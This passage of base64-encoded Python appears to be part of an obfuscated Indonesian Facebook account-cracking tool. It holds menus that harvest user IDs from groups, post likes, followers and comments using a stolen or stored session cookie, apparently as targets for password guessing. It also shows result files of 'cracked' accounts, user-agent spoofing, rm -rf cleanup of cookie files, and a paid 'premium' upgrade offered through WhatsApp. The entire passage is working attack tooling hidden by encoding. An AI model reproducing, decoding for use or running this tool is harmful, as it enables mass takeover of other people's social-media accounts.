uZ2FuIGtvc29uZyBrZW50b2QhJyUoTixNLE4pKTt0aW1lLnNsZWVwKDIpO21vY2hfeWF5YW4oKQ0KICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgIHByaW50KCJcbiBbIV0gdW50dWsgYmVyaGVudGkgdGVrYW4gQ1RSTCBsYWx1IHRla2FuIGMgZGkga2V5Ym9hcmQgYW5kYS4iKQ0KICAgICAgICAgICAgICAgIGZvbGxvd2VycyhmImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9zdWJzY3JpYmUvbGlzdHMvP2lkPXtrb250b2x9IikNCiAgICAgICAgICAgIGV4Y2VwdCBLZXlFcnJvcjoNCiAgICAgICAgICAgICAgICBwcmludChmIlxuIFshXSBXaHkge2tvbnRvbH0gbWlraXIgZG9uZyB0b2xvbCwgbWFzdWtpbiBpZCBwb3N0aW5nYW4geWFuZyBiZW5lciBuZ2VudG9kIik7dGltZS5zbGVlcCgyKTttb2NoX3lheWFuKCkNCiAgICBlbGlmIHBlcGVrIGluWyc0JywnMDQnXToNCiAg""ICAgICAgaWYgdG9keiA9PSAnVHJpYWwnOg0KICAgICAgICAgICAgamFsYW4oZiJcbntOfSBbe019w5d7Tn1dIGFuZGEgYWRhbGFoIHVzZXIgdHJpYWwgY3VtYSBiaXNhIG1lbmdndW5ha2FuIG1lbnUgbm9tb3Ige019MDIue059IHVwZ3JhZGUga2UgcHJlbWl1bSB1bnR1ayBtZW5pa21hdGkgc2VtdWEgZml0dXJlLi4uIik7ZXhpdCgpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBrb250b2wgPSBpbnB1dChmIntOfSBbP10gbWFzdWthbiBpZCBwb3N0aW5nYW4gOiAiKQ0KICAgICAgICAgICAgaWYga29udG9sIGluWyIiLCIgIl06DQogICAgICAgICAgICAgICAgcHJpbnQoJ1xuICVzWyVzw5clc10gamFuZ2FuIGtvc29uZyBrZW50b2QhJyUoTixNLE4pKTt0aW1lLnNsZWVwKDIpO21vY2hfeWF5YW4oKQ0KICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgIHByaW50KCJcbiBbIV0gdW50dWsgYmVyaGVudGkgdGVrYW4gQ1RSTCBsYWx1IHRla2FuIGMgZGkga2V5Ym9hcmQgYW5kYS4iKQ0KICAgICAgICAgICAgICAgIGxpa2VfcG9zdChmImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS91ZmkvcmVhY3Rpb24vcHJvZmlsZS9icm93c2VyLz9mdF9lbnRfaWRlbnRpZmllcj17a29udG9sfSIpDQogICAgICAgICAgICBleGNlcHQgS2V5RXJyb3I6DQogICAgICAgICAgICAgICAgcHJpbnQoZiJcbiBbIV0gV2h5IHtrb250b2x9IG1pa2lyIGRvbmcgdG9sb2wsIG1hc3VraW4gaWQgcG9zdGluZ2FuIHlhbmcgYmVuZXIgbmdlbnRvZCIpO3RpbWUuc2xlZXAoMik7bW9jaF95YXlhbigpDQogICAgZWxpZiBwZXBlayBpblsnNScsJzA1J106DQogICAgICAgIGlmIHRvZHogPT0gJ1RyaWFsJzoNCiAgICAgICAgICAgIGphbGFuKGYiXG57Tn0gW3tNfcOXe059XSBhbmRhIGFkYWxhaCB1c2VyIHRyaWFsIGN1bWEgYmlzYSBtZW5nZ3VuYWthbiBtZW51IG5vbW9yIHtNfTAyLntOfSB1cGdyYWRlIGtlIHByZW1pdW0gdW50dWsgbWVuaWttYXRpIHNlbXVhIGZpdHVyZS4uLiIpO2V4aXQoKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgX25nb2Nva18odG9rZW56KQ0KICAgIGVsaWYgcGVwZWsgaW5bJzYnLCcwNiddOg0KICAgICAgICBpZiB0b2R6ID09ICdUcmlhbCc6DQogICAgICAgICAgICBqYWxhbihmIlxue059IFt7TX3Dl3tOfV0gYW5kYSBhZGFsYWggdXNlciB0cmlhbCBjdW1hIGJpc2EgbWVuZ2d1bmFrYW4gbWVudSBub21vciB7TX0wMi57Tn0gdXBncmFkZSBrZSBwcmVtaXVtIHVudHVrIG1lbmlrbWF0aSBzZW11YSBmaXR1cmUuLi4iKTtleGl0KCkNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIGtvbnRvbCA9IGlucHV0KGYie059IFs/XSBtYXN1a2FuIGlkIHBvc3RpbmdhbiA6ICIpDQogICAgICAgICAgICBpZiBrb250b2wgaW5bIiIsIiAiXToNCiAgICAgICAgICAgICAgICBwcmludCgnXG4gJXNbJXPDlyVzXSBqYW5nYW4ga29zb25nIGtlbnRvZCEnJShOLE0sTikpO3RpbWUuc2xlZXAoMik7bW9jaF95YXlhbigpDQogICAgICAgICAg""ICB0cnk6DQogICAgICAgICAgICAgICAgcHJpbnQoIlxuIFshXSB1bnR1ayBiZXJoZW50aSB0ZWthbiBDVFJMIGxhbHUgdGVrYW4gYyBkaSBrZXlib2FyZCBhbmRhLiIpDQogICAgICAgICAgICAgICAgbmdvbWVuX3Bvc3QoZiJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20ve2tvbnRvbH0iKQ0KICAgICAgICAgICAgZXhjZXB0IEtleUVycm9yOg0KICAgICAgICAgICAgICAgIHByaW50KGYiXG4gWyFdIFdoeSB7a29udG9sfSBtaWtpciBkb25nIHRvbG9sLCBtYXN1a2luIGlkIHBvc3RpbmdhbiB5YW5nIGJlbmVyIG5nZW50b2QiKTt0aW1lLnNsZWVwKDIpO21vY2hfeWF5YW4oKQ0KICAgIGVsaWYgcGVwZWsgaW5bJzcnLCcwNyddOg0KICAgICAgICBpZiB0b2R6ID09ICdUcmlhbCc6DQogICAgICAgICAgICBqYWxhbihmIlxue059IFt7TX3Dl3tOfV0gYW5kYSBhZGFsYWggdXNlciB0cmlhbCBjdW1hIGJpc2EgbWVuZ2d1bmFrYW4gbWVudSBub21vciB7TX0wMi57Tn0gdXBncmFkZSBrZSBwcmVtaXVtIHVudHVrIG1lbmlrbWF0aSBzZW11YSBmaXR1cmUuLi4iKTtleGl0KCkNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIGdhYnV0KCkNCiAgICBlbGlmIHBlcGVrIGluWyc4JywnMDgnXToNCiAgICAgICAgc2V0aW5nX3ludGt0cygpDQogICAgZWxpZiBwZXBlayBpblsnOScsJzA5J106DQogICAgICAgIGRpcnMgPSBvcy5saXN0ZGlyKCJyZXN1bHRzIikNCiAgICAgICAgcHJpbnQoJ1xuIFsgaGFzaWwgY3JhY2sgeWFuZyB0ZXJzaW1wYW4gZGkgZmlsZSBhbmRhIF1cbicpDQogICAgICAgIGZvciBmaWxlIGluIGRpcnM6DQogICAgICAgICAgICBwcmludCgiIFslcyslc10gJXMiJShPLE4sZmlsZSkpDQogICAgICAgIGZpbGUgPSBpbnB1dCgiXG4gWyVzPyVzXSBtYXN1a2FuIG5hbWEgZmlsZSA6JXMgIiUoTSxOLEgpKQ0KICAgICAgICBpZiBmaWxlID09ICIiOg0KICAgICAgICAgICAgZmlsZSA9IGlucHV0KCJcbiAlc1slcz8lc10gbWFzdWthbiBuYW1hIGZpbGUgOiVzICVzIiUoTixNLE4sSCxOKSkNCiAgICAgICAgdG90YWwgPSBvcGVuKCJyZXN1bHRzLyVzIiUoZmlsZSkpLnJlYWQoKS5zcGxpdGxpbmVzKCkNCiAgICAgICAgcHJpbnQoIiAlc1slcyMlc10gLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0iJShOLE8sTikpO3RpbWUuc2xlZXAoMikNCiAgICAgICAgbm1fZmlsZSA9ICgiJXMiJShmaWxlKSkucmVwbGFjZSgiLSIsICIgIikNCiAgICAgICAgaHBzX25tICA9IG5tX2ZpbGUucmVwbGFjZSgiLnR4dCIsICIiKS5yZXBsYWNlKCJPSyIsICIiKS5yZXBsYWNlKCJDUCIsICIiKS5yZXBsYWNlKCJjcF9kZXRla3RvciIsICIiKS5yZXBsYWNlKCJpbnZhbGlkX29rIiwgIiIpDQogICAgICAgIGphbGFuKCIgWyVzKiVzXSBIYXNpbCAlc2NyYWNrJXMgcGFkYSB0YW5nZ2FsICVzOiVzJXMlcyB0b3RhbCAlczogJXMlcyVzIiUoTSxOLE8sTixNLE8saHBzX25tLE4sTSxPLGxlbih0b3RhbCksTykpDQogICAgICAgIHBy""aW50KCIgJXNbJXMjJXNdIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIiUoTixPLE4pKTt0aW1lLnNsZWVwKDIpDQogICAgICAgIGZvciBtZW1layBpbiB0b3RhbDoNCiAgICAgICAgICAgIGtvbnRvbCA9IG1lbWVrLnJlcGxhY2UoIlxuIiwiIikNCiAgICAgICAgICAgIHRpdGlkICA9IGtvbnRvbC5yZXBsYWNlKCIgW+Kck10gIiwiIFx4MWJbMG1bXHgxYlsxOzkybeKck1x4MWJbMG1dXHgxYlsxOzkybSAiKS5yZXBsYWNlKCIgW8OXXSAiLCAiIFx4MWJbMG1bXHgxYlsxOzkzbcOXXHgxYlswbV1ceDFiWzE7OTNtICIpDQogICAgICAgICAgICBwcmludCgiJXMlcyIlKHRpdGlkLE4pKTt0aW1lLnNsZWVwKDAuMDMpDQogICAgICAgIHByaW50KCIgJXNbJXMjJXNdIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIiUoTixPLE4pKQ0KICAgICAgICBpbnB1dCgnXG4gIFsgJXNLRU1CQUxJJXMgXSAnJShPLE4pKTttb2NoX3lheWFuKCkNCiAgICBlbGlmIHBlcGVrIGluWycxMCddOg0KICAgICAgICBqYWxhbihmIlxuIHtIfSAgPj4+IERhcGF0a2FuIHVzZXIgcHJlbWl1bSB1bnR1ayBtZW5pa21hdGkgc2VtdWEgZml0dXJlISE8PDx7Tn1cbiIpDQogICAgICAgIHVwZCA9IGlucHV0KCIgWz9dIGFwYWthaCBpbmdpbiB1cGdyYWRlIGtlIHByZW1pdW0gW1kvdF06ICIpDQogICAgICAgIGlmIHVwZCA9PSIiOg0KICAgICAgICAgICAgZXhpdChmIntOfVt7TX3Dl3tOfV0gWS90IG1lbWVrISIpDQogICAgICAgIGVsaWYgdXBkIGluWyJZIiwieSJdOg0KICAgICAgICAgICAgamFsYW4oIlxuICVzKiAlc0FuZGEgYWthbiBkaSBhbGloa2FuIGtlIHdoYXRzYXBwLi4uIiUoTyxIKSk7dGltZS5zbGVlcCgwLjAyKQ0KICAgICAgICAgICAgb3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3dhLm1lLysyMzQ4MTEwMDQ0NDE4P3RleHQ9UkFUVStFUlJPUitCRUxJK0xJU0VOU0lOWUErRE9PT05HLi4uLi4uLi4uLi4/Pz8nKTt0aW1lLnNsZWVwKDIpO2V4aXQoKQ0KICAgICAgICBlbGlmIHVwZCBpblsiVCIsInQiXToNCiAgICAgICAgICAgIGphbGFuKGYie0J9IEdvb2QgYnllZTopIik7ZXhpdCgpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBleGl0KGYie059W3tNfcOXe059XSBZL3QgbWVtZWshIikNCiAgICBlbGlmIHBlcGVrIGluWycwJywnMDAnXToNCiAgICAgICAgcHJpbnQoIiIpDQogICAgICAgIHRpdGlrID0gWydceDFiWzE7OTJtLiAgICcsICdceDFiWzE7OTNtLi4gICcsICdceDFiWzE7OTZtLi4uICcsJ1x4MWJbMTs5Mm0uICAgJywgJ1x4MWJbMTs5M20uLiAgJywgJ1x4MWJbMTs5Nm0uLi4gJ10NCiAgICAgICAgZm9yIHggaW4gdGl0aWs6DQogICAgICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKCdcciAlc1slcyslc10gbWVuZ2hhcHVzIGNvb2tpZSAlcyclKE4sTSxOLHgpKTsgc3lzLnN0ZG91dC5mbHVzaCgpDQogICAgICAgICAgICB0aW1lLnNsZWVwKDEpDQogICAgICAgIG9zLnN5c3Rl""bSgncm0gLXJmIC50b2tlbi50eHQnKTtvcy5zeXN0ZW0oJ3JtIC1yZiAuY29raWUudHh0JykNCiAgICAgICAgZXhpdCgnXG4gJXNbJXPinJMlc10lcyBiZXJoYXNpbCBtZW5naGFwdXMgY29va2llJyUoTixNLE4sSCkpDQogICAgZWxzZToNCiAgICAgICAgcHJpbnQoJ1xuICVzWyVzw5clc10gbWVudSBbJXMlcyVzXSB0aWRhayBhZGEsIGNlayBtZW51IG55YSBicm8hJyUoTixNLE4sTSxwZXBlayxOKSk7dGltZS5zbGVlcCgyKTttb2NoX3lheWFuKCkNCiAgICByZXR1cm4gX19jcmFja19fKCkucGxlcnIoaWQpDQoNCg0KIyMjIEdBTlRJIFVTRVIgQUdFTlQNCmRlZiBzZXRpbmdfeW50a3RzKCk6DQogICAgcHJpbnQoJ1xuICglczElcykgQ0hBTkdFIFVTRVIgYWdlbnQnJShPLEgpKQ0KICAgIHByaW50KCcgKCVzMiVzKSBDSEVDSyBVU0VSIGFnZW50JyUoTyxIKSkNCiAgICB5dGJqdHMgPSBpbnB1dCgnXG4gJXNbJXM/JXNdIGNob29zZSA6ICclKE8sSCxPKSkNCiAgICBpZiB5dGJqdHMgPT0gJyc6DQogICAgICAgIHByaW50KCdcbiAlc1slc8OXJXNdIEdhayBib2xlaCBrb3NvbmcgS2VudG9kJyUoTixNLE4pKTt0aW1lLnNsZWVwKDIpO3NldGluZ195bnRrdHMoKQ0KICAgIGVsaWYgeXRianRzIGluWycxJywnMDEnXToNCiAgICAgICAgeW9fbmRha190YXVfa29fdGFueWFfc2FpYSgpDQogICAgZWxpZiB5dGJqdHMgaW5bJzInLCcwMiddOg0KICAgICAgICB0cnk6DQogICAgICAgICAgICB1c2VyX2FnZW50ID0gb3BlbignLllOVEtUUy50eHQnLCAncicpLnJlYWQoKQ0KICAgICAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAgICAgICAgIHVzZXJfYWdlbnQgPSAnJXMtJyUoTSkNCiAgICAgICAgcHJpbnQoJ1xuICVzWyVzKyVzXSBVc2VyIEFnZW50IGFuZGEgOiAlcyVzJyUoTixPLE4sSCx1c2VyX2FnZW50KSkNCiAgICAgICAgaW5wdXQoJ1xuICAlc1sgJXNrZW1iYWxpJXMgXSclKE4sTyxOKSk7bW9jaF95YXlhbigpDQogICAgZWxzZToNCiAgICAgICAgcHJpbnQoJ1xuICVzWyVzw5clc10gaW5wdXQgeWFuZyBiZW5lciclKE4sTSxOKSk7dGltZS5zbGVlcCgyKTtzZXRpbmdfeW50a3RzKCkNCg0KIyBVU0VSIEFHRU5UIEJBUlUNCmRlZiB5b19uZGFrX3RhdV9rb190YW55YV9zYWlhKCk6DQogICAgb3Muc3lzdGVtKCdybSAtcmYgLllOVEtUUy50eHQnKQ0KICAgIF9hc3VfID0gaW5wdXQoJ1xuIFslcz8lc10gaW5naW4gbWVuZ2d1bmFrYW4gdXNlciBhZ2VudCBocCBhbmRhIFtZL3RdOiAnJShPLE4pKQ0KICAgIGlmIF9hc3VfID09ICcnOg0KICAgICAgICBwcmludCgnXG4gJXNbJXPDlyVzXSBHYWsgYm9sZWgga29zb25nIEtlbnRvZCclKE4sTSxOKSk7eW9fbmRha190YXVfa29fdGFueWFfc2FpYSgpDQogICAgZWxpZiBfYXN1XyBpblsnWScsJ3knXToNCiAgICAgICAgamFsYW4oJ1xuICVzIColcyBhbmRhIGFrYW4gZGkgYXJha2FuIGtlIHNpdHVzIHdlYiBzZXRlbGFoIGRpIGFyYWhrYW4ga2Ugc2l0dXMgd2ViLlxuICAlcyolcyBrbGlrIGlrb24gJXNN""WSBVU0VSIEFHRU5UJXMgbGFsdSBjb3B5IHNlbXVhIHVzZXIgYWdlbnQgYW5kYS4uLiclKE8sTixPLE4sSCxOKSk7dGltZS5zbGVlcCgyKTtvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vd3d3LnlheWFueGQubXkuaWQvc2VydmVyJykNCiAgICAgICAgX2FnZW5fID0gaW5wdXQoJyBbJXM/JXNdIG1hc3VrYW4gdXNlciBhZ2VudCBocCBhbmRhIDolcyAnJShPLE4sSCkpDQogICAgICAgIG9wZW4oJy5ZTlRLVFMudHh0JywgJ3cnKS53cml0ZShfYWdlbl8pO3RpbWUuc2xlZXAoMikNCiAgICAgICAgamFsYW4oJ1xuICVzWyVz4pyTJXNdIGJlcmhhc2lsIG1lbmdndW5ha2FuIHVzZXIgYWdlbnQgaHAgYW5kYS4uLiclKE4sSCxOKSkNCiAgICAgICAgaW5wdXQoJ1xuICAlc1sgJXNrZW1iYWxpJXMgXSclKE4sTyxOKSk7bW9jaF95YXlhbigpDQogICAgZWxpZiBfYXN1XyBpblsnVCcsJ3QnXToNCiAgICAgICAgX2FnZW5fID0gaW5wdXQoJyBbJXM/JXNdIG1hc3VrYW4gdXNlciBhZ2VudCA6JXMgJyUoTyxOLEgpKQ0KICAgICAgICBvcGVuKCcuWU5US1RTLnR4dCcsICd3Jykud3JpdGUoX2FnZW5fKTt0aW1lLnNsZWVwKDIpDQogICAgICAgIGphbGFuKCdcbiAlc1slc+KckyVzXSBiZXJoYXNpbCBtZW5nZ2FudGkgdXNlciBhZ2VudC4uLiclKE4sSCxOKSkNCiAgICAgICAgaW5wdXQoJ1xuICAlc1sgJXNrZW1iYWxpJXMgXSclKE4sTyxOKSk7bW9jaF95YXlhbigpDQogICAgZWxzZToNCiAgICAgICAgcHJpbnQoJ1xuICVzWyVzISVzXSBZL3QgbmdlbnRvZCclKE4sTSxOKSk7eW9fbmRha190YXVfa29fdGFueWFfc2FpYSgpDQoNCiMgQ1JBQ0sgREFSSSBHUlVQDQpkZWYgY3JhY2tfZ3J1cChoZW5jZXQpOg0KICAgIHRyeToNCiAgICAgICAgY29va2l6ID0gb3BlbignLmNva2llLnR4dCcpLnJlYWQoKQ0KICAgICAgICBrdWVoICA9IHsiY29va2llIjpjb29raXp9DQogICAgICAgIGtvbnRvbD1yZXF1ZXN0cy5nZXQoaGVuY2V0LGNvb2tpZXM9a3VlaCkudGV4dA0KICAgICAgICBtZW1laz1yZS5maW5kYWxsKCdcPGgzXD5cPGFcIGNsYXNzXD1cIi4uXCJcIGhyZWZcPVwiXC8oLio/KVwiXD4oLio/KTxcL2FcPicsa29udG9sKQ0KICAgICAgICBmb3Igc29mdGVrIGluIG1lbWVrOg0KICAgICAgICAgICAgaWYgInByb2ZpbGUucGhwPyIgaW4gc29mdGVrWzBdOg0KICAgICAgICAgICAgICAgIGlkLmFwcGVuZChyZS5maW5kYWxsKCJpZD0oLiopIixzb2Z0ZWtbMF0pWzBdKyI8PT4iK3NvZnRla1sxXSkNCiAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgaWQuYXBwZW5kKHNvZnRla1swXSsiPD0+Iitzb2Z0ZWtbMV0pDQogICAgICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKCdcciBbKl0gc2VkYW5nIG1lbmd1bXB1bGthbiAlcyBpZC4uLiAnJShsZW4oaWQpKSk7IHN5cy5zdGRvdXQuZmx1c2goKQ0KICAgICAgICBpZiAiTGloYXQgU2VsZW5na2FwbnlhIiBpbiBrb250b2w6DQogICAgICAgICAgICBjcmFja19ncnVwKHVybF9tYitCZWF1dGlmdWxTb3Vw""KGtvbnRvbCwiaHRtbC5wYXJzZXIiKS5maW5kKCJhIixzdHJpbmc9IkxpaGF0IFNlbGVuZ2thcG55YSIpLmdldCgiaHJlZiIpKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgZGVmIGdlaChnZXkpOg0KICAgICAgICAgICAgICAgIGE9cmVxdWVzdHMuZ2V0KGdleSxjb29raWVzPWt1ZWgpLnRleHQNCiAgICAgICAgICAgICAgICBiPXJlLmZpbmRhbGwoJ1w8aDNcIGNsYXNzXD1cIi4qPyI+XDxzcGFuPlw8c3Ryb25nPlw8YVwgaHJlZlw9XCIvKC4qPylcIj4oLio/KTwvYVw+XDwvc3Ryb25nXD4nLGEpDQogICAgICAgICAgICAgICAgaWYgbGVuKGIpIT0wOg0KICAgICAgICAgICAgICAgICAgICBmb3IgYyBpbiBiOg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgInByb2ZpbGUucGhwIiBpbiBjWzBdOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGQ9cmUuc2VhcmNoKCJwcm9maWxlLnBocFw/aWQ9KFxcZCopIixjWzBdKS5ncm91cCgxKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGQgaW4gaWQ6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWQuYXBwZW5kKGQrIjw9PiIrY1sxXSkNCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZD1yZS5zZWFyY2goIiguKj8pXD9yZWZpZCIsY1swXSkuZ3JvdXAoMSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBkIGluIGlkOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlkLmFwcGVuZChkKyI8PT4iK2NbMV0pDQogICAgICAgICAgICAgICAgICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKCdcciBbKl0gc2VkYW5nIG1lbmd1bXB1bGthbiAlcyBpZC4uLiAnJShsZW4oaWQpKSk7IHN5cy5zdGRvdXQuZmx1c2goKQ0KICAgICAgICAgICAgICAgIGlmICJMaWhhdCBQb3N0aW5nYW4gTGFpbm55YSIgaW4gYToNCiAgICAgICAgICAgICAgICAgICAgZ2VoKHVybF9tYitCZWF1dGlmdWxTb3VwKGEsImh0bWwucGFyc2VyIikuZmluZCgiYSIsc3RyaW5nPSJMaWhhdCBQb3N0aW5nYW4gTGFpbm55YSIpLmdldCgiaHJlZiIpKQ0KICAgICAgICAgICAgZ2VoKGYie3VybF9tYn0vZ3JvdXBzLyIrcmUuc2VhcmNoKCJpZD0oXFxkKikiLGhlbmNldCkuZ3JvdXAoMSkpDQogICAgZXhjZXB0OnBhc3MNCiMgQ1JBQ0sgTElLRSBQT1NUSU5HQU4NCmRlZiBsaWtlX3Bvc3QoaGVuY2V0KToNCiAgICB0cnk6DQogICAgICAgIGNvb2tpeiA9IG9wZW4oJy5jb2tpZS50eHQnKS5yZWFkKCkNCiAgICAgICAga3VlaCAgPSB7ImNvb2tpZSI6Y29va2l6fQ0KICAgICAgICBrb250b2w9cmVxdWVzdHMuZ2V0KGhlbmNldCxjb29raWVzPWt1ZWgpLnRl""eHQNCiAgICAgICAgaWYgIlNlbXVhIDAiIGluIGtvbnRvbDoNCiAgICAgICAgICAgIHByaW50KCJcbiBbIV0gVGlkYWsgYWRhIHlhbmcgbWVuYW5nZ2FwaSBwb3N0aW5nYW4sIGF3b2thd29rYXdvayBrYXNpYW4gYWt1biBueWEgc2VwaTp2Iik7dGltZS5zbGVlcCgyKTttb2NoX3lheWFuKCkNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIG1lbWVrPXJlLmZpbmRhbGwoJ1w8aDNcIGNsYXNzXD1cIi4uIlw+XDxhXCBocmVmXD1cIiguKj8pIlw+KC4qPyk8XC9hXD4nLGtvbnRvbCkNCiAgICAgICAgICAgIGZvciBzb2Z0ZWsgaW4gbWVtZWs6DQogICAgICAgICAgICAgICAgaWYgInByb2ZpbGUucGhwPyIgaW4gc29mdGVrWzBdOg0KICAgICAgICAgICAgICAgICAgICBpZC5hcHBlbmQocmUuZmluZGFsbCgiaWQ9KC4qKSIsc29mdGVrWzBdKVswXSsiPD0+Iitzb2Z0ZWtbMV0pDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgaWQuYXBwZW5kKHJlLmZpbmRhbGwoIi8oLiopIixzb2Z0ZWtbMF0pWzBdKyI8PT4iK3NvZnRla1sxXSkNCiAgICAgICAgICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKCdcciBbKl0gc2VkYW5nIG1lbmd1bXB1bGthbiAlcyBpZC4uLiAnJShsZW4oaWQpKSk7IHN5cy5zdGRvdXQuZmx1c2goKQ0KICAgICAgICAgICAgaWYgIkxpaGF0IFNlbGVuZ2thcG55YSIgaW4ga29udG9sOg0KICAgICAgICAgICAgICAgIGxpa2VfcG9zdCh1cmxfbWIrQmVhdXRpZnVsU291cChrb250b2wsImh0bWwucGFyc2VyIikuZmluZCgiYSIsc3RyaW5nPSJMaWhhdCBTZWxlbmdrYXBueWEiKS5nZXQoImhyZWYiKSkNCiAgICBleGNlcHQ6cGFzcw0KIyBDUkFDSyBGT0xMT1dFUlMNCmRlZiBmb2xsb3dlcnMoaGVuY2V0KToNCiAgICB0cnk6DQogICAgICAgIGNvb2tpeiA9IG9wZW4oJy5jb2tpZS50eHQnKS5yZWFkKCkNCiAgICAgICAga3VlaCAgPSB7ImNvb2tpZSI6Y29va2l6fQ0KICAgICAgICBrb250b2w9cmVxdWVzdHMuZ2V0KGhlbmNldCxjb29raWVzPWt1ZWgpLnRleHQNCiAgICAgICAgbWVtZWsgPSBCZWF1dGlmdWxTb3VwKGtvbnRvbCwnaHRtbC5wYXJzZXInKQ0KICAgICAgICBmb3IgbW1rIGluIG1lbWVrLmZpbmRfYWxsKCdhJyxocmVmPVRydWUpOg0KICAgICAgICAgICAgaWYgInByb2ZpbGUucGhwIiBpbiBtbWsuZ2V0KCdocmVmJyk6DQogICAgICAgICAgICAgICAgYmIgPSBtbWsudGV4dA0KICAgICAgICAgICAgICAgIHhkID0gIiIuam9pbihiczQucmUuZmluZGFsbCgicHJvZmlsZVwucGhwXD9pZD0oLio/KSYiLG1tay5nZXQoImhyZWYiKSkpDQogICAgICAgICAgICAgICAgaWQuYXBwZW5kKGJiKyc8PT4nK3hkKydcbicpDQogICAgICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKCdcciBbKl0gc2VkYW5nIG1lbmd1bXB1bGthbiAlcyBpZC4uLiAnJShsZW4oaWQpKSk7IHN5cy5zdGRvdXQuZmx1c2goKQ0KICAgICAgICBmb3IgYXN1IGluIG1lbWVrLmZpbmRfYWxsKCdhJyxocmVmPVRydWUpOg0KICAgICAgICAg""ICAgaWYgJ0xpaGF0IFNlbGVuZ2thcG55YScgaW4gYXN1LnRleHQ6DQogICAgICAgICAgICAgICAgZm9sbG93ZXJzKCJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vc3Vic2NyaWJlL2xpc3RzLz9pZD0iK2FzdS5nZXQoImhyZWYiKSkNCiAgICBleGNlcHQ6cGFzcw0KIyBDUkFDSyBLT01FTlRBUiBQT1NUSU5HQU4NCmRlZiBuZ29tZW5fcG9zdChoZW5jZXQpOg0KICAgIHRyeToNCiAgICAgICAgY29va2l6ID0gb3BlbignLmNva2llLnR4dCcpLnJlYWQoKQ0KICAgICAgICBrdWVoICA9IHsiY29va2llIjpjb29raXp9DQogICAgICAgIGtvbnRvbD0gcmVxdWVzdHMuZ2V0KGhlbmNldCxjb29raWVzPWt1ZWgsaGVhZGVycz1oZWFkZXJfZ3J1cCkudGV4dC5lbmNvZGUoInV0Zi04IikNCiAgICAgICAgbWVtZWsgPSBCZWF1dGlmdWxTb3VwKGtvbnRvbCwnaHRtbC5wYXJzZXInKQ0KICAgICAgICBmb3IgbW1rIGluIG1lbWVrLmZpbmRfYWxsKCdoMycpOg0KICAgICAgICAgICAgZm9yIF9pZF8gaW4gbW1rLmZpbmRfYWxsKCdhJyxocmVmPVRydWUpOg0KICAgICAgICAgICAgICAgIGlmICJwcm9maWxlLnBocCIgaW4gX2lkXy5nZXQoImhyZWYiKToNCiAgICAgICAgICAgICAgICAgICAgeHogPSBfaWRfLmdldCgiaHJlZiIpLnNwbGl0KCc9JylbMV0NCiAgICAgICAgICAgICAgICAgICAgYmIgPSB4ei5zcGxpdCgnJicpWzBdDQogICAgICAgICAgICAgICAgICAgIHhkID0gX2lkXy50ZXh0DQogICAgICAgICAgICAgICAgICAgIGlkLmFwcGVuZChiYisnPD0+Jyt4ZCsnXG4nKQ0KICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgIHh6ID0gX2lkXy5nZXQoImhyZWYiKS5zcGxpdCgnPycpWzBdDQogICAgICAgICAgICAgICAgICAgIGJiID0geHouc3BsaXQoJy8nKVsxXQ0KICAgICAgICAgICAgICAgICAgICB4ZCA9IF9pZF8udGV4dA0KICAgICAgICAgICAgICAgICAgICBpZC5hcHBlbmQoYmIrJzw9PicreGQrJ1xuJykNCiAgICAgICAgICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKCdcciBbKl0gc2VkYW5nIG1lbmd1bXB1bGthbiAlcyBpZC4uLiAnJShsZW4oaWQpKSk7IHN5cy5zdGRvdXQuZmx1c2goKQ0KICAgICAgICBmb3IgYXN1IGluIG1lbWVrLmZpbmRfYWxsKCJhIixocmVmPVRydWUpOg0KICAgICAgICAgICAgaWYgIkxpaGF0IGtvbWVudGFyIGxhaW5ueWHigKYiIGluIGFzdS50ZXh0Og0KICAgICAgICAgICAgICAgIG5nb21lbl9wb3N0KCJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vIithc3UuZ2V0KCJocmVmIikpDQogICAgZXhjZXB0OnBhc3MNCiMgQ1JBQ0sgSUQgUkFORE9NDQpkZWYgX25nb2Nva18oX19wcGtfXyk6DQogICAgdHJ5Og0KICAgICAgICBuYW55YV9rZ